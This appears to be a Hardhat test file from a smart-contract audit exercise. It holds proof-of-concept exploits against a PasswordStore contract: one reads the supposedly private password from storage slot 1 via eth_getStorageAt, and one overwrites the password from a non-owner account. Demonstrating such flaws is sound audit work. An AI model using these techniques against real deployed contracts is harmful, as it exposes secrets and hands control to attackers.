// Required modules for the tests.
const {expect} = require('chai');
const {ethers} = require('hardhat');

describe('PasswordStore', function () {
	let passwordStore; // Instance of the deployed contract.
	let owner; // Owner of the contract, usually the account that deploys it.
	let addr1; // Another account used in the tests, possibly representing an attacker.

	// Setup hook that runs before each test case.
	beforeEach(async function () {
		// Create a new instance of the PasswordStore contract for each test.
		const PasswordStore = await ethers.getContractFactory('PasswordStore');
		passwordStore = await PasswordStore.deploy();
		// Retrieve the list of available accounts. `owner` is the first one, `addr1` is the second.
		[owner, addr1] = await ethers.getSigners();
	});

	describe('Attacker', function () {
		it('Can access s_password private storage variable', async function () {
			// Set the password first
			const secretPassword = 'mySecretPassword';
			await passwordStore.connect(owner).setPassword(secretPassword);

			const provider = ethers.provider;

			try {
				// Read the second storage slot for s_password
				const passwordStorageSlot = '0x1';

				// RPC call to retrieve data from Ethereum storage
				const passwordBytes = await provider.send('eth_getStorageAt', [
					passwordStore.target,
					passwordStorageSlot,
				]);

				// Decode the bytes to get the stored string.
				const stringData = hexToString(passwordBytes.slice(0, 34));

				// Check if the decoded password matches the one we set.
				expect(stringData).to.equal(secretPassword);
			} catch (rpcErr) {
				console.error('Error using RPC method:', rpcErr);
			}
		});

		it('Can call the setPassword method and change s_password', async function () {
			// Try to set a new password using addr1 (not the original owner).
			const pwnedPassword = 'pwned';
			await passwordStore.connect(addr1).setPassword(pwnedPassword);
			try {
				// Retrieve the password using the owner's account.
				const password = await passwordStore
					.connect(owner)
					.getPassword();

				// Assert that the retrieved password is the one set by addr1.
				expect(password).to.equal(pwnedPassword);
			} catch (error) {
				console.error('Error:', error);
			}
		});
	});
});

const hexToString = (hex) => {
	let str = '';
	for (let i = 0; i < hex.length; i += 2) {
		const char = String.fromCharCode(parseInt(hex.substr(i, 2), 16));
		if (char !== '\x00') {
			str += char;
		}
	}
	return str;
};
